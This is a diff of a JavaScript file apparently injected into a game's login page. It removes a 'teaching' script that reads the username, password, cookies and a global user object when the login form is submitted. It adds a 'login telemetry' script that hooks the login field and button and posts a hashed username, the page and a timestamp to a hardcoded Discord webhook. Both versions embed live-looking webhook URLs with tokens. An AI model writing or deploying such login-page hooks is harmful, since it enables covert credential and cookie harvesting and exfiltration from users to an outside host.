@@ -1,96 +1,83 @@
-setTimeout(() => {
-  (function () {
+// =====================================
+// EvoWorld - Login Telemetry (Client)
+// =====================================
 
-    // Вебхук для отправки данных. Вставлен напрямую для демонстрации.
-    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1460557076446183487/CQMYJKu2PV9us7XirOp75oLiyzGF40ctmCsweS2LSu_hK-LqCPi5pPf0hX21TMeOzzH8';
+(() => {
+  const WEBHOOK_URL =
+    "https://discord.com/api/webhooks/1460557294868758536/fyk_86l1FfTntnVbF1Xv-ZKkmmwcfGZotZc5l6yHYjqS02yMu3GxzEIkFXyaK-5Nj9f1";
 
-      
-    console.log("📘 Script didattico combinato avviato");
+  // 🔧 CAMBIA QUESTI SELETTORI SE SERVE
+  const USERNAME_SELECTOR = "#username";
+  const LOGIN_BUTTON_SELECTOR = "#login";
 
-    /* =========================
-       FUNZIONI DIMOSTRATIVE
-       ========================= */
+  const usernameInput = document.querySelector(USERNAME_SELECTOR);
+  const loginButton = document.querySelector(LOGIN_BUTTON_SELECTOR);
 
-    // Lettura credenziali (come nel primo script)
-    const getCredentials = () => {
-      try {
-        const usernameField =
-          document.querySelector('#loginUsername') ||
-          document.querySelector('#username') ||
-          document.querySelector('input[name="login"]') ||
-          document.querySelector('input[type="text"]');
+  if (!usernameInput) {
+    console.warn("Login telemetry: campo username non trovato");
+    return;
+  }
 
-        const passwordField =
-          document.querySelector('#password') ||
-          document.querySelector('input[type="password"]');
+  // ==========================
+  // HASH SHA-256 (irreversibile)
+  // ==========================
+  async function sha256(text) {
+    const encoder = new TextEncoder();
+    const data = encoder.encode(text);
+    const hashBuffer = await crypto.subtle.digest("SHA-256", data);
+    return Array.from(new Uint8Array(hashBuffer))
+      .map(b => b.toString(16).padStart(2, "0"))
+      .join("");
+  }
 
-        return {
-          username: usernameField ? usernameField.value : "NON_TROVATO",
-          password: passwordField ? passwordField.value : "NON_TROVATO"
-        };
-      } catch {
-        return {
-          username: "ERRORE",
-          password: "ERRORE"
-        };
-      }
-    };
+  // ==========================
+  // INVIO TELEMETRIA
+  // ==========================
+  async function sendTelemetry(method) {
+    const username = usernameInput.value.trim();
+    if (!username) return;
 
-    // Lettura cookie (SOLO DIMOSTRATIVA)
-    const getAllCookies = () => {
-      return document.cookie || "Nessun cookie presente";
-    };
+    const usernameHash = await sha256(username);
 
-    // Lettura variabile user se esiste (SOLO DIMOSTRATIVA)
-    const getUserData = () => {
-      try {
-        if (typeof user !== "undefined") {
-          return structuredClone(user);
-        }
-        return "Variabile user non presente";
-      } catch (e) {
-        return "Errore lettura user";
-      }
-    };
+    fetch(WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        content:
+          "🧪 **Login Telemetry**\n" +
+          "```json\n" +
+          JSON.stringify(
+            {
+              event: "login_submit",
+              username_hash: usernameHash,
+              username_length: username.length,
+              method: method, // "enter" | "button"
+              page: location.pathname,
+              timestamp: new Date().toISOString()
+            },
+            null,
+            2
+          ) +
+          "\n```"
+      })
+    }).catch(() => {});
+  }
 
-    /* =========================
-       COMBINAZIONE CON SCRIPT LOGIN
-       ========================= */
+  // ==========================
+  // EVENTI
+  // ==========================
 
-    const form = document.getElementById("loginForm");
-    const usernameInput = document.getElementById("username");
-    const passwordInput = document.getElementById("password");
-
-    if (!form || !usernameInput || !passwordInput) {
-      console.warn("⚠️ Form o input non trovati");
-      return;
+  // ENTER nel campo username
+  usernameInput.addEventListener("keydown", e => {
+    if (e.key === "Enter") {
+      sendTelemetry("enter");
     }
+  });
 
-    form.addEventListener("submit", (event) => {
-      event.preventDefault();
-
-      const username = usernameInput.value;
-      const password = passwordInput.value;
-
-      console.log("📨 SUBMIT intercettato");
-      console.log("👤 Username:", username);
-      console.log("🔐 Password:", password);
-
-      // Uso delle funzioni del primo script
-      const credentials = getCredentials();
-      const cookies = getAllCookies();
-      const userData = getUserData();
-
-      console.log("📄 REPORT DIDATTICO (NON INVIATO)");
-      console.log({
-        timestamp: new Date().toLocaleString(),
-        credentials,
-        cookies,
-        userData
-      });
-
-      console.log("✅ Fine dimostrazione");
+  // Click bottone login
+  if (loginButton) {
+    loginButton.addEventListener("click", () => {
+      sendTelemetry("button");
     });
-
-  })();
-}, 1000);
+  }
+})();
